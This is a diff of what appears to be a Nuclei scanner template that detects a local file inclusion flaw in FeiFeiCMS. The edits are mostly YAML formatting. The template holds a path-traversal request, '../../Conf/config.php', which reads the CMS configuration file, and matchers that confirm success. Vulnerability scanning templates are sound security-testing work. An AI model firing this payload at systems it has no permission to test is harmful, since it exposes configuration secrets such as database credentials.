@@ -1,5 +1,4 @@
 id: feifeicms-lfr
-
 info:
   name: FeiFeiCms - Local File Inclusion
   author: princechaddha
@@ -13,20 +12,15 @@ info:
     cvss-score: 7.5
     cwe-id: CWE-22
   tags: feifeicms,lfi
-  metadata:
-    max-request: 1
-
-http:
+requests:
   - method: GET
     path:
       - "{{BaseURL}}/index.php?s=Admin-Data-down&id=../../Conf/config.php"
-
     matchers-condition: and
     matchers:
       - type: status
         status:
           - 200
-
       - type: word
         words:
           - "<?php"
